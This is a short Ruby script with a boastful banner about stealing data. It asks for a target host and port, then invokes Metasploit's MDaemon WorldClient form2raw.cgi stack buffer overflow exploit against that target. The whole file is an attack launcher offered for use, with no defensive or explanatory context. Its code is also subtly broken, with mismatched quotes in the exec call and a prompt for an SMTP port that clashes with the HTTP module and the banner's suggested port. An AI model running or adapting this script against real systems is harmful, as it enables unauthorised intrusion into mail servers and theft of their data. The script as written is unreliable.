puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  

     1st Try {set RPORT 3000; 2nd RPORT ?}

     MDaemon WorldClient form2raw.cgi Stack Buffer Overflow
"""

puts " [?] What is the target? "
print "[!] --->"
target = gets.chomp

puts " [?] Which SMTP server port (e.g. 25, 465, 587, 2525)? "
print " [!] ---> "
port = gets.chomp




exec(msfconsole -x "exploit/windows/http/mdaemon_worldclient_form2raw' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

